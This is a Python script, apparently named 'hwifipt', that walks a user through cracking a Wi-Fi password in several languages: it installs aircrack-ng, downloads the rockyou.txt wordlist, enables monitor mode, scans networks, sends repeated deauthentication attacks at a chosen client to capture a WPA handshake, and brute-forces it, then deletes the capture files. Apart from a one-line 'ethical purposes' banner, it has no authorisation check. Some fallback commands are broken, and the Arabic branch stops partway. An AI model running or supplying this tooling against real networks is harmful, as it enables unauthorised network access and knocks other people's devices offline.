def main():
    print("Ejecutando hwifipt...")    
    import subprocess
    import time
    import signal
    import glob

    def mostrar_banner():
        print(r"""
    *********************************
    _             _  __ _       _   
    | |____      _(_)/ _(_)_ __ | |_ 
    | '_ \ \ /\ / / | |_| | '_ \| __|
    | | | \ V  V /| |  _| | |_) | |_ 
    |_| |_|\_/\_/ |_|_| |_| .__/ \__|
                        |_|          
                
    *********************************
    """)

    mostrar_banner()

    print("Let's start hacking the Wi-Fi for ethical purposes if it has a weak password")
    print("Select language")
    print("1-Español")
    print("2-English")
    print("3-Français")
    print("4-عرب")
    print("5-Duits")
    print("6-Român")
    print("7-Русский")
    print("8-俄羅斯")
    print("9-ロシア語")
    idioma = input("Enter selection:")



    #español



    if idioma == "1":
        def detectar_sistema_operativo():
            try:

                resultado = subprocess.run(["lsb_release", "-d"], capture_output=True, text=True)
                if resultado.returncode == 0:
                    descripcion = resultado.stdout.lower()
                    if "arch" in descripcion or "manjaro" in descripcion:
                        return "Arch Linux / Manjaro", "1"
                    elif "fedora" in descripcion or "red hat" in descripcion or "rhel" in descripcion or "centos" in descripcion:

                        return "Fedora / RHEL / CentOS", "2"
                    elif "debian" in descripcion or "ubuntu" in descripcion:
                        return "Distribución basada en Debian/Ubuntu", "4"
            except Exception:
                pass


            try:
                with open("/etc/os-release", "r") as f:
                    contenido = f.read().lower()
                    if "arch" in contenido or "manjaro" in contenido:
                        return "Arch Linux / Manjaro", "1"
                    elif "fedora" in contenido or "red hat" in contenido or "rhel" in contenido or "centos" in contenido:
                        return "Fedora / RHEL / CentOS", "2"
                    elif "debian" in contenido or "ubuntu" in contenido:
                        return "Distribución basada en Debian/Ubuntu", "4"
            except Exception:
                pass

            return None, None

        os_detectado, opcion_os = detectar_sistema_operativo()
        if os_detectado:
            print(f"\nDetectado sistema operativo: {os_detectado}")
            respuesta_os = input("¿Es correcto? (si/no): ").strip().lower()
            if respuesta_os != "si":
                os_detectado = None

        if not os_detectado:
            print("\n¿Qué sistema operativo tienes? Selecciona el número:")
            print("1--> Arch Linux / Manjaro")
            print("2--> Fedora / RHEL / CentOS")
            print("3--> Fedora/RHEL/CentOS (versiones antiguas)")
            print("4--> Distribución basada en Debian/Ubuntu")
            opcion_os = input("Opción: ").strip()


        while True:
            print("\n¿Tienes instalado aircrack-ng? (si/no)")
            respuesta_instalacion = input().strip().lower()

            if respuesta_instalacion == "no":
                if opcion_os == "1":
                    print("Instalando en Arch Linux/Manjaro...")
                    subprocess.run(["sudo", "pacman", "-Sy", "aircrack-ng", "--noconfirm"])
                elif opcion_os == "2":
                    print("Instalando en Fedora/RHEL/CentOS...")
                    subprocess.run(["sudo", "dnf", "install", "-y", "aircrack-ng"])
                elif opcion_os == "3":
                    print("Instalando en versiones antiguas...")
                    subprocess.run(["sudo", "yum", "install", "-y", "aircrack-ng"])
                elif opcion_os == "4":
                    print("Instalando en Debian/Ubuntu...")
                    subprocess.run("sudo apt update && sudo apt install -y aircrack-ng", shell=True)
                break

            elif respuesta_instalacion == "si":
                break


        print("¿Tienes un fichero de contraseñas?")
        print("si/no")
        decision_directorio = input().strip().lower()

        if decision_directorio == "no":
            subprocess.run(["sudo", "wget", "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt"])
        else:
            print("Ok, sigamos")


        while True:
            print("\n¿Sabes cuál es tu tarjeta de red? (si/no)")
            respuesta_tarjeta = input().strip().lower()

            if respuesta_tarjeta == "si":
                break
            elif respuesta_tarjeta == "no":
                print("\nMostrando interfaces de red...")
                subprocess.run(["ip", "a"])
                print("\nBusca la interfaz WiFi (generalmente wlan0, wlp2s0, etc.)")
                time.sleep(2)

        print("\nIntroduce el nombre de tu tarjeta de red (ej: wlan0):")
        tarjeta = input().strip()


        print(f"\nPoniendo {tarjeta} en modo monitor...")
        subprocess.run(["sudo", "airmon-ng", "check", "kill"])
        subprocess.run(["sudo", "airmon-ng", "start", tarjeta])


        print("\nEscaneando redes WiFi...")
        print("¿Cuántos segundos quieres escanear?")
        try:
            tiempo_auditoria = int(input())
        except ValueError:
            print("Error: Introduce un número válido")
            exit(1)

        proceso = subprocess.Popen(["sudo", "airodump-ng", f"{tarjeta}mon"])

        try:
            time.sleep(tiempo_auditoria)
        except KeyboardInterrupt:
            print("\nEscaneo interrumpido")
        finally:
            proceso.terminate()
            proceso.wait()
            subprocess.run(["sudo", "pkill", "airodump-ng"])


        print("\n¿Quieres continuar? (si/no)")
        seguir_1 = input().strip().lower()

        if seguir_1 == "no":
            print("\nDeteniendo modo monitor...")
            subprocess.run(["sudo", "airmon-ng", "stop", f"{tarjeta}mon"])
            print("Modo monitor detenido")
            print("¿que sistema operativo husas?")
            print("habilitando internet")
            if opcion_os == "1":
                print("habilitando wifi en Arch Linux/Manjaro...")
                result = subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"])
                if result.returncode != 0:
                    subprocess.run(["sudo", "systemctl", "subprocess.run"])
                exit()
            elif opcion_os == "2":
                print("Instalando en Fedora/RHEL/CentOS...")
                subprocess.run(["sudo", "systemctl", "restart", "network-online.target"])
                exit()
            elif opcion_os == "3":
                print("Instalando en versiones antiguas...")
                subprocess.run(["sudo", "service", "network", "restart"])
                exit()
            elif opcion_os == "4":
                print("Instalando en Debian/Ubuntu...")
                result = subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"])
                if result.returncode != 0:
                    subprocess.run(["sudo", "systemctl", "restart", "networking"])
                exit()
            exit()
        if seguir_1 == "si":
            print("\nContinuando con el proceso...")

        print("Ahora dime los datos de la red")
        print("Necesito:")
        print("BSSID:")
        BSSID = input().strip()
        print("Canal (CH):")
        CH = input().strip()

        subprocess.run(["sudo", "iwconfig", f"{tarjeta}mon", "channel", CH])

        print("Ahora te voy a mostrar un comando que deberás abrir en otra terminal para capturar el handshake")
        print("Primero dime el nombre del archivo donde guardarás la auditoría:")
        nombre_auditoria = input().strip()
        print(f"\nEl comando es:\nsudo airodump-ng -c {CH} --bssid {BSSID} -w {nombre_auditoria} {tarjeta}mon")
        print("Cuando alguien se conecte, deberás introducir la STATION del dispositivo")


        station = input("Introduce la STATION (MAC del dispositivo): ").strip()


        print("¿Cuántas peticiones quieres mandar por vez? (recomendado 9)")
        peticiones = input().strip()
        if not peticiones.isdigit():
            print("Número de peticiones inválido")
            exit(1)

        print("¿Ejecutar ahora el ataque de desautenticación? (si/no)")
        decision_desautentificacion1 = input().strip().lower()

        if decision_desautentificacion1 == "si":
            subprocess.run(["sudo", "aireplay-ng", "--ignore-negative-one", "-0", peticiones, "-a", BSSID, "-c", station, f"{tarjeta}mon"])
        elif decision_desautentificacion1 == "no":
            archivos = glob.glob(nombre_auditoria + "*")
            if archivos:
                subprocess.run(["sudo", "rm", "-f"] + archivos)
            exit()


        while True:
            print("¿Mandar otra vez el ataque? (si/no)")
            decision = input().strip().lower()
            if decision == "si":
                subprocess.run(["sudo", "aireplay-ng", "--ignore-negative-one", "-0", peticiones, "-a", BSSID, "-c", station, f"{tarjeta}mon"])
            elif decision == "no":
                break


        print("Perfecto, solo queda un paso.")
        print("¿El script te ha descargado el diccionario rockyou.txt? (si/no)")
        instalado = input().strip().lower()

        if instalado == "si":
            directorio = "rockyou.txt"
        else:
            directorio = input("Introduce la ruta del diccionario: ").strip()


        print("¿Empezar ya con la fuerza bruta para sacar la contraseña? (si/no)")
        decision_final = input().strip().lower()

        if decision_final == "si":
            subprocess.run(["sudo", "aircrack-ng", "-b", BSSID, "-w", directorio, nombre_auditoria + "-01.cap"])
        else:
            archivos = glob.glob(nombre_auditoria + "*")
            if archivos:
                subprocess.run(["sudo", "rm", "-f"] + archivos)
            exit()
        if decision_final == "no":
            print("\nDeteniendo modo monitor...")
            subprocess.run(["sudo", "airmon-ng", "stop", f"{tarjeta}mon"])
            print("Modo monitor detenido")
            print("¿que sistema operativo husas?")
            print("habilitando internet")
            if opcion_os == "1":
                print("habilitando wifi en Arch Linux/Manjaro...")
                subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"])
                archivos = glob.glob(nombre_auditoria + "*")
                if archivos:
                    subprocess.run(["sudo", "rm", "-f"] + archivos)
                exit()
            elif opcion_os == "2":
                print("Instalando en Fedora/RHEL/CentOS...")
                subprocess.run(["sudo", "systemctl", "restart", "network-online.target"])
                archivos = glob.glob(nombre_auditoria + "*")
                if archivos:
                    subprocess.run(["sudo", "rm", "-f"] + archivos)
                exit()
            elif opcion_os == "3":
                print("Instalando en versiones antiguas...")
                subprocess.run(["sudo", "service", "network", "restart"])
                archivos = glob.glob(nombre_auditoria + "*")
                if archivos:
                    subprocess.run(["sudo", "rm", "-f"] + archivos)
                exit()
            elif opcion_os == "4":
                print("Instalando en Debian/Ubuntu...")
                result = subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"])
                if result.returncode != 0:
                    subprocess.run(["sudo", "systemctl", "restart", "networking"])
                archivos = glob.glob(nombre_auditoria + "*")
                if archivos:
                    subprocess.run(["sudo", "rm", "-f"] + archivos)
                exit()



                                                                                                                            #ingles
    elif idioma == "2":
        def detect_operating_system():
            try:
                result = subprocess.run(["lsb_release", "-d"], capture_output=True, text=True)
                if result.returncode == 0:
                    description = result.stdout.lower()
                    if "arch" in description or "manjaro" in description:
                        return "Arch Linux / Manjaro", "1"
                    elif any(x in description for x in ["fedora", "red hat", "rhel", "centos"]):
                        return "Fedora / RHEL / CentOS", "2"
                    elif "debian" in description or "ubuntu" in description:
                        return "Debian/Ubuntu-based Distribution", "4"
            except Exception:
                pass

            try:
                with open("/etc/os-release", "r") as f:
                    content = f.read().lower()
                    if "arch" in content or "manjaro" in content:
                        return "Arch Linux / Manjaro", "1"
                    elif any(x in content for x in ["fedora", "red hat", "rhel", "centos"]):
                        return "Fedora / RHEL / CentOS", "2"
                    elif "debian" in content or "ubuntu" in content:
                        return "Debian/Ubuntu-based Distribution", "4"
            except Exception:
                pass

            return None, None


        os_detected, os_option = detect_operating_system()
        if os_detected:
            print(f"\nDetected operating system: {os_detected}")
            confirm = input("Is this correct? (yes/no): ").strip().lower()
            if confirm != "yes":
                os_detected = None

        if not os_detected:
            print("\nWhat is your operating system? Choose a number:")
            print("1--> Arch Linux / Manjaro")
            print("2--> Fedora / RHEL / CentOS")
            print("3--> Fedora/RHEL/CentOS (older versions)")
            print("4--> Debian/Ubuntu-based distribution")
            os_option = input("Option: ").strip()

        while True:
            print("\nDo you have aircrack-ng installed? (yes/no)")
            answer = input().strip().lower()

            if answer == "no":
                if os_option == "1":
                    print("Installing on Arch Linux/Manjaro...")
                    subprocess.run(["sudo", "pacman", "-Sy", "aircrack-ng", "--noconfirm"])
                elif os_option == "2":
                    print("Installing on Fedora/RHEL/CentOS...")
                    subprocess.run(["sudo", "dnf", "install", "-y", "aircrack-ng"])
                elif os_option == "3":
                    print("Installing on older versions...")
                    subprocess.run(["sudo", "yum", "install", "-y", "aircrack-ng"])
                elif os_option == "4":
                    print("Installing on Debian/Ubuntu...")
                    subprocess.run("sudo apt update && sudo apt install -y aircrack-ng", shell=True)
                break
            elif answer == "yes":
                break

        print("Do you have a password file?")
        print("yes/no")
        has_wordlist = input().strip().lower()

        if has_wordlist == "no":
            subprocess.run(["sudo", "wget", "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt"])
        else:
            print("Ok, let's continue")

        while True:
            print("\nDo you know your network interface? (yes/no)")
            knows_interface = input().strip().lower()

            if knows_interface == "yes":
                break
            elif knows_interface == "no":
                print("\nShowing network interfaces...")
                subprocess.run(["ip", "a"])
                print("\nLook for your WiFi interface (usually wlan0, wlp2s0, etc.)")
                time.sleep(2)

        print("\nEnter your WiFi interface name (e.g., wlan0):")
        interface = input().strip()

        print(f"\nPutting {interface} into monitor mode...")
        subprocess.run(["sudo", "airmon-ng", "check", "kill"])
        subprocess.run(["sudo", "airmon-ng", "start", interface])

        print("\nScanning WiFi networks...")
        print("How many seconds do you want to scan?")
        try:
            scan_time = int(input())
        except ValueError:
            print("Error: Enter a valid number")
            exit(1)

        process = subprocess.Popen(["sudo", "airodump-ng", f"{interface}mon"])

        try:
            time.sleep(scan_time)
        except KeyboardInterrupt:
            print("\nScan interrupted")
        finally:
            process.terminate()
            process.wait()
            subprocess.run(["sudo", "pkill", "airodump-ng"])

        print("\nDo you want to continue? (yes/no)")
        continue_1 = input().strip().lower()

        if continue_1 == "no":
            print("\nStopping monitor mode...")
            subprocess.run(["sudo", "airmon-ng", "stop", f"{interface}mon"])
            print("Monitor mode stopped")
            print("Re-enabling internet connection")
            if os_option == "1":
                print("Re-enabling WiFi on Arch Linux/Manjaro...")
                result = subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"])
                if result.returncode != 0:
                    subprocess.run(["sudo", "systemctl", "restart", "networking"])
                exit()
            elif os_option == "2":
                subprocess.run(["sudo", "systemctl", "restart", "network-online.target"])
                exit()
            elif os_option == "3":
                subprocess.run(["sudo", "service", "network", "restart"])
                exit()
            elif os_option == "4":
                result = subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"])
                if result.returncode != 0:
                    subprocess.run(["sudo", "systemctl", "restart", "networking"])
                exit()

        if continue_1 == "yes":
            print("\nContinuing with the process...")

        print("Now enter the network information")
        print("I need:")
        print("BSSID:")
        BSSID = input().strip()
        print("Channel (CH):")
        CH = input().strip()

        subprocess.run(["sudo", "iwconfig", f"{interface}mon", "channel", CH])

        print("Now I’ll show you a command you need to run in another terminal to capture the handshake")
        print("First, enter the name of the file where you’ll save the capture:")
        audit_name = input().strip()
        print(f"\nThe command is:\nsudo airodump-ng -c {CH} --bssid {BSSID} -w {audit_name} {interface}mon")
        print("When someone connects, enter the device's STATION (MAC address)")

        station = input("Enter STATION (MAC address): ").strip()

        print("How many deauth packets to send per try? (recommended: 9)")
        packets = input().strip()
        if not packets.isdigit():
            print("Invalid number of packets")
            exit(1)

        print("Run the deauth attack now? (yes/no)")
        run_attack = input().strip().lower()

        if run_attack == "yes":
            subprocess.run(["sudo", "aireplay-ng", "--ignore-negative-one", "-0", packets, "-a", BSSID, "-c", station, f"{interface}mon"])
        elif run_attack == "no":
            files = glob.glob(audit_name + "*")
            if files:
                subprocess.run(["sudo", "rm", "-f"] + files)
            exit()

        while True:
            print("Send another deauth attack? (yes/no)")
            repeat = input().strip().lower()
            if repeat == "yes":
                subprocess.run(["sudo", "aireplay-ng", "--ignore-negative-one", "-0", packets, "-a", BSSID, "-c", station, f"{interface}mon"])
            elif repeat == "no":
                break

        print("Perfect, just one step left.")
        print("Did the script download rockyou.txt for you? (yes/no)")
        has_dict = input().strip().lower()

        if has_dict == "yes":
            wordlist = "rockyou.txt"
        else:
            wordlist = input("Enter the path to your dictionary: ").strip()

        print("Start brute force now to try to get the password? (yes/no)")
        final_decision = input().strip().lower()

        if final_decision == "yes":
            subprocess.run(["sudo", "aircrack-ng", "-b", BSSID, "-w", wordlist, audit_name + "-01.cap"])
        else:
            files = glob.glob(audit_name + "*")
            if files:
                subprocess.run(["sudo", "rm", "-f"] + files)
            exit()

        if final_decision == "no":
            print("\nStopping monitor mode...")
            subprocess.run(["sudo", "airmon-ng", "stop", f"{interface}mon"])
            print("Monitor mode stopped")
            print("Re-enabling internet...")
            if os_option == "1":
                print("Re-enabling WiFi on Arch Linux/Manjaro...")
                subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"])
            elif os_option == "2":
                subprocess.run(["sudo", "systemctl", "restart", "network-online.target"])
            elif os_option == "3":
                subprocess.run(["sudo", "service", "network", "restart"])
            elif os_option == "4":
                result = subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"])
                if result.returncode != 0:
                    subprocess.run(["sudo", "systemctl", "restart", "networking"])
            files = glob.glob(audit_name + "*")
            if files:
                subprocess.run(["sudo", "rm", "-f"] + files)
            exit()
                                                                                                                            #frances
    elif idioma == "3":
        def detectar_sistema_operativo():
            try:
                resultado = subprocess.run(["lsb_release", "-d"], capture_output=True, text=True)
                if resultado.returncode == 0:
                    descripcion = resultado.stdout.lower()
                    if "arch" in descripcion or "manjaro" in descripcion:
                        return "Arch Linux / Manjaro", "1"
                    elif "fedora" in descripcion or "red hat" in descripcion or "rhel" in descripcion or "centos" in descripcion:
                        return "Fedora / RHEL / CentOS", "2"
                    elif "debian" in descripcion or "ubuntu" in descripcion:
                        return "Distribution basée sur Debian/Ubuntu", "4"
            except Exception:
                pass

            try:
                with open("/etc/os-release", "r") as f:
                    contenido = f.read().lower()
                    if "arch" in contenido or "manjaro" in contenido:
                        return "Arch Linux / Manjaro", "1"
                    elif "fedora" in contenido or "red hat" in contenido or "rhel" in contenido or "centos" in contenido:
                        return "Fedora / RHEL / CentOS", "2"
                    elif "debian" in contenido or "ubuntu" in contenido:
                        return "Distribution basée sur Debian/Ubuntu", "4"
            except Exception:
                pass

            return None, None
        os_detectado, opcion_os = detectar_sistema_operativo()
        if os_detectado:
            print(f"\nSystème d'exploitation détecté : {os_detectado}")
            respuesta_os = input("Est-ce correct ? (oui/non) : ").strip().lower()
            if respuesta_os != "oui":
                os_detectado = None

        if not os_detectado:
            print("\nQuel système d'exploitation utilisez-vous ? Sélectionnez le numéro :")
            print("1--> Arch Linux / Manjaro")
            print("2--> Fedora / RHEL / CentOS")
            print("3--> Fedora/RHEL/CentOS (versions anciennes)")
            print("4--> Distribution basée sur Debian/Ubuntu")
            opcion_os = input("Option : ").strip()


        while True:
            print("\nAvez-vous installé aircrack-ng ? (oui/non)")
            respuesta_instalacion = input().strip().lower()

            if respuesta_instalacion == "non":
                if opcion_os == "1":
                    print("Installation sur Arch Linux/Manjaro...")
                    subprocess.run(["sudo", "pacman", "-Sy", "aircrack-ng", "--noconfirm"])
                elif opcion_os == "2":
                    print("Installation sur Fedora/RHEL/CentOS...")
                    subprocess.run(["sudo", "dnf", "install", "-y", "aircrack-ng"])
                elif opcion_os == "3":
                    print("Installation sur versions anciennes...")
                    subprocess.run(["sudo", "yum", "install", "-y", "aircrack-ng"])
                elif opcion_os == "4":
                    print("Installation sur Debian/Ubuntu...")
                    subprocess.run("sudo apt update && sudo apt install -y aircrack-ng", shell=True)
                break

            elif respuesta_instalacion == "oui":
                break


        print("Avez-vous un fichier de mots de passe ?")
        print("oui/non")
        decision_directorio = input().strip().lower()

        if decision_directorio == "non":
            subprocess.run(["sudo", "wget", "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt"])
        else:
            print("Ok, continuons")


        while True:
            print("\nConnaissez-vous votre carte réseau ? (oui/non)")
            respuesta_tarjeta = input().strip().lower()

            if respuesta_tarjeta == "oui":
                break
            elif respuesta_tarjeta == "non":
                print("\nAffichage des interfaces réseau...")
                subprocess.run(["ip", "a"])
                print("\nRecherchez l'interface WiFi (généralement wlan0, wlp2s0, etc.)")
                time.sleep(2)

        print("\nEntrez le nom de votre carte réseau (ex : wlan0) :")
        tarjeta = input().strip()


        print(f"\nMise en mode monitor de {tarjeta}...")
        subprocess.run(["sudo", "airmon-ng", "check", "kill"])
        subprocess.run(["sudo", "airmon-ng", "start", tarjeta])


        print("\nScan des réseaux WiFi...")
        print("Combien de secondes voulez-vous scanner ?")
        try:
            tiempo_auditoria = int(input())
        except ValueError:
            print("Erreur : Entrez un nombre valide")
            exit(1)

        proceso = subprocess.Popen(["sudo", "airodump-ng", f"{tarjeta}mon"])

        try:
            time.sleep(tiempo_auditoria)
        except KeyboardInterrupt:
            print("\nScan interrompu")
        finally:
            proceso.terminate()
            proceso.wait()
            subprocess.run(["sudo", "pkill", "airodump-ng"])


        print("\nVoulez-vous continuer ? (oui/non)")
        seguir_1 = input().strip().lower()

        if seguir_1 == "non":
            print("\nArrêt du mode monitor...")
            subprocess.run(["sudo", "airmon-ng", "stop", f"{tarjeta}mon"])
            print("Mode monitor arrêté")
            print("Quel système d'exploitation utilisez-vous ?")
            print("Activation d'internet")
            if opcion_os == "1":
                print("Activation WiFi sur Arch Linux/Manjaro...")
                result = subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"])
                if result.returncode != 0:
                    subprocess.run(["sudo", "systemctl", "subprocess.run"])
                exit()
            elif opcion_os == "2":
                print("Installation sur Fedora/RHEL/CentOS...")
                subprocess.run(["sudo", "systemctl", "restart", "network-online.target"])
                exit()
            elif opcion_os == "3":
                print("Installation sur versions anciennes...")
                subprocess.run(["sudo", "service", "network", "restart"])
                exit()
            elif opcion_os == "4":
                print("Installation sur Debian/Ubuntu...")
                result = subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"])
                if result.returncode != 0:
                    subprocess.run(["sudo", "systemctl", "restart", "networking"])
                exit()
            exit()
        if seguir_1 == "oui":
            print("\nPoursuite du processus...")


        print("Maintenant donnez-moi les informations du réseau")
        print("J'ai besoin :")
        print("BSSID :")
        BSSID = input().strip()
        print("Canal (CH) :")
        CH = input().strip()

        subprocess.run(["sudo", "iwconfig", f"{tarjeta}mon", "channel", CH])

        print("Je vais maintenant vous montrer une commande que vous devrez exécuter dans un autre terminal pour capturer le handshake")
        print("D'abord donnez-moi le nom du fichier où sauvegarder l'audit :")
        nombre_auditoria = input().strip()
        print(f"\nLa commande est :\nsudo airodump-ng -c {CH} --bssid {BSSID} -w {nombre_auditoria} {tarjeta}mon")
        print("Quand quelqu'un se connectera, vous devrez entrer la STATION du dispositif")


        station = input("Entrez la STATION (MAC du dispositif) : ").strip()


        print("Combien de requêtes voulez-vous envoyer à la fois ? (recommandé 9)")
        peticiones = input().strip()
        if not peticiones.isdigit():
            print("Nombre de requêtes invalide")
            exit(1)

        print("Exécuter maintenant l'attaque de déauthentification ? (oui/non)")
        decision_desautentificacion1 = input().strip().lower()

        if decision_desautentificacion1 == "oui":
            subprocess.run(["sudo", "aireplay-ng", "--ignore-negative-one", "-0", peticiones, "-a", BSSID, "-c", station, f"{tarjeta}mon"])
        elif decision_desautentificacion1 == "non":
            archivos = glob.glob(nombre_auditoria + "*")
            if archivos:
                subprocess.run(["sudo", "rm", "-f"] + archivos)
            exit()


        while True:
            print("Envoyer à nouveau l'attaque ? (oui/non)")
            decision = input().strip().lower()
            if decision == "oui":
                subprocess.run(["sudo", "aireplay-ng", "--ignore-negative-one", "-0", peticiones, "-a", BSSID, "-c", station, f"{tarjeta}mon"])
            elif decision == "non":
                break


        print("Parfait, il ne reste qu'une étape.")
        print("Le script a-t-il téléchargé le dictionnaire rockyou.txt ? (oui/non)")
        instalado = input().strip().lower()

        if instalado == "oui":
            directorio = "rockyou.txt"
        else:
            directorio = input("Entrez le chemin du dictionnaire : ").strip()


        print("Commencer maintenant la force brute pour trouver le mot de passe ? (oui/non)")
        decision_final = input().strip().lower()

        if decision_final == "oui":
            subprocess.run(["sudo", "aircrack-ng", "-b", BSSID, "-w", directorio, nombre_auditoria + "-01.cap"])
        else:
            archivos = glob.glob(nombre_auditoria + "*")
            if archivos:
                subprocess.run(["sudo", "rm", "-f"] + archivos)
            exit()
        if decision_final == "non":
            print("\nArrêt du mode monitor...")
            subprocess.run(["sudo", "airmon-ng", "stop", f"{tarjeta}mon"])
            print("Mode monitor arrêté")
            print("Quel système d'exploitation utilisez-vous ?")
            print("Activation d'internet")
            if opcion_os == "1":
                print("Activation WiFi sur Arch Linux/Manjaro...")
                subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"])
                archivos = glob.glob(nombre_auditoria + "*")
                if archivos:
                    subprocess.run(["sudo", "rm", "-f"] + archivos)
                exit()
            elif opcion_os == "2":
                print("Installation sur Fedora/RHEL/CentOS...")
                subprocess.run(["sudo", "systemctl", "restart", "network-online.target"])
                archivos = glob.glob(nombre_auditoria + "*")
                if archivos:
                    subprocess.run(["sudo", "rm", "-f"] + archivos)
                exit()
            elif opcion_os == "3":
                print("Installation sur versions anciennes...")
                subprocess.run(["sudo", "service", "network", "restart"])
                archivos = glob.glob(nombre_auditoria + "*")
                if archivos:
                    subprocess.run(["sudo", "rm", "-f"] + archivos)
                exit()
            elif opcion_os == "4":
                print("Installation sur Debian/Ubuntu...")
                result = subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"])
                if result.returncode != 0:
                    subprocess.run(["sudo", "systemctl", "restart", "networking"])
                archivos = glob.glob(nombre_auditoria + "*")
                if archivos:
                    subprocess.run(["sudo", "rm", "-f"] + archivos)
                exit()
                                                                                                                            #arabe
    elif idioma == "4":
        def detectar_sistema_operativo():
            try:
                resultado = subprocess.run(["lsb_release", "-d"], capture_output=True, text=True)
                if resultado.returncode == 0:
                    descripcion = resultado.stdout.lower()
                    if "arch" in descripcion or "manjaro" in descripcion:
                        return "أرش لينكس / مانجارو", "1"
                    elif "fedora" in descripcion or "red hat" in descripcion or "rhel" in descripcion or "centos" in descripcion:
                        return "فيدورا / RHEL / سنتوس", "2"
                    elif "debian" in descripcion or "ubuntu" in descripcion:
                        return "توزيعة مبنية على دبيان/أوبنتو", "4"
            except Exception:
                pass

            try:
                with open("/etc/os-release", "r") as f:
                    contenido = f.read().lower()
                    if "arch" in contenido or "manjaro" in contenido:
                        return "أرش لينكس / مانجارو", "1"
                    elif "fedora" in contenido or "red hat" in contenido or "rhel" in contenido or "centos" in contenido:
                        return "فيدورا / RHEL / سنتوس", "2"
                    elif "debian" in contenido or "ubuntu" in contenido:
                        return "توزيعة مبنية على دبيان/أوبنتو", "4"
            except Exception:
                pass

            return None, None

        os_detectado, opcion_os = detectar_sistema_operativo()
        if os_detectado:
            print(f"\nتم اكتشاف نظام التشغيل: {os_detectado}")
            respuesta_os = input("هل هذا صحيح؟ (نعم/لا): ").strip().lower()
            if respuesta_os != "نعم":
                os_detectado = None

        if not os_detectado:
            print("\nما هو نظام التشغيل الذي تستخدمه؟ اختر الرقم:")
            print("1--> أرش لينكس / مانجارو")
            print("2--> فيدورا / RHEL / سنتوس")
            print("3--> فيدورا/RHEL/سنتوس (إصدارات قديمة)")
            print("4--> توزيعة مبنية على دبيان/أوبنتو")
            opcion_os = input("الخيار: ").strip()

        while True:
            print("\nهل قمت بتثبيت aircrack-ng؟ (نعم/لا)")
            respuesta_instalacion = input().strip().lower()

            if respuesta_instalacion == "لا":
                if opcion_os == "1":
                    print("جاري التثبيت على أرش لينكس/مانجارو...")
                    subprocess.run(["sudo", "pacman", "-Sy", "aircrack-ng", "--noconfirm"])
                elif opcion_os == "2":
                    print("جاري التثبيت على فيدورا/RHEL/سنتوس...")
                    subprocess.run(["sudo", "dnf", "install", "-y", "aircrack-ng"])
                elif opcion_os == "3":
                    print("جاري التثبيت على الإصدارات القديمة...")
                    subprocess.run(["sudo", "yum", "install", "-y", "aircrack-ng"])
                elif opcion_os == "4":
                    print("جاري التثبيت على دبيان/أوبنتو...")
                    subprocess.run("sudo apt update && sudo apt install -y aircrack-ng", shell=True)
                break

            elif respuesta_instalacion == "نعم":
                break

        print("هل لديك ملف كلمات مرور؟")
        print("نعم/لا")
        decision_directorio = input().strip().lower()

        if decision_directorio == "لا":
            subprocess.run(["sudo", "wget", "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt"])
        else:
            print("حسنًا، لنكمل")

        while True:
            print("\nهل تعرف ما هي بطاقة الشبكة لديك؟ (نعم/لا)")
            respuesta_tarjeta = input().strip().lower()

            if respuesta_tarjeta == "نعم":
                break
            elif respuesta_tarjeta == "لا":
                print("\nجاري عرض واجهات الشبكة...")
                subprocess.run(["ip", "a"])
                print("\nابحث عن واجهة الواي فاي (عادة wlan0, wlp2s0, إلخ)")
                time.sleep(2)

        print("\nأدخل اسم بطاقة الشبكة لديك (مثال: wlan0):")
        tarjeta = input().strip()

        print(f"\nجاري تفعيل وضع المراقبة لـ {tarjeta}...")
        subprocess.run(["sudo", "airmon-ng", "check", "kill"])
        subprocess.run(["sudo", "airmon-ng", "start", tarjeta])

        print("\nجاري مسح شبكات الواي فاي...")
        print("كم ثانية تريد أن تستغرق عملية المسح؟")
        try:
            tiempo_auditoria = int(input())
        except ValueError:
            print("خطأ: أدخل رقمًا صحيحًا")
            exit(1)

        proceso = subprocess.Popen(["sudo", "airodump-ng", f"{tarjeta}mon"])

        try:
            time.sleep(tiempo_auditoria)
        except KeyboardInterrupt:
            print("\nتم إيقاف المسح")
        finally:
            proceso.terminate()
            proceso.wait()
            subprocess.run(["sudo", "pkill", "airodump-ng"])

        print("\nهل تريد الاستمرار؟ (نعم/لا)")
        seguir_1 = input().strip().lower()

        if seguir_1 == "لا":
            print("\nجاري إيقاف وضع المراقبة...")
            subprocess.run(["sudo", "airmon-ng", "stop", f"{tarjeta}mon"])
            print("تم إيقاف وضع المراقبة")
            print("ما هو نظام التشغيل الذي تستخدمه؟")
            print("جاري تفعيل الإنترنت")
            if opcion_os == "1":
                print("جاري تفعيل الواي فاي على أرش لينكس/مانجارو...")
                result = subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"])
                if result.returncode != 0:
                    subprocess.run(["sudo", "systemctl", "subprocess.run"])
                exit()
            elif opcion_os == "2":
                print("جاري التثبيت على فيدورا/RHEL/سنتوس...")
                subprocess.run(["sudo", "systemctl", "restart", "network-online.target"])
                exit()
            elif opcion_os == "3":
                print("جاري التثبيت على الإصدارات القديمة...")
                subprocess.run(["sudo", "service", "network", "restart"])
                exit()
            elif opcion_os == "4":
                print("جاري التثبيت على دبيان/أوبنتو...")
                result = subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"])
                if result.returncode != 0:
                    subprocess.run(["sudo", "systemctl", "restart", "networking"])
                exit()
            exit()
        if seguir_1 == "نعم":
            print("\nجاري متابعة العملية...")

        print("الآن أعطني بيانات الشبكة")
        print("أحتاج إلى:")
        print("BSSID:")
        BSSID = input().strip()
        print("القناة (CH):")
        CH = input().strip()

        subprocess.run(["sudo", "iwconfig", f"{tarjeta}mon", "channel", CH])

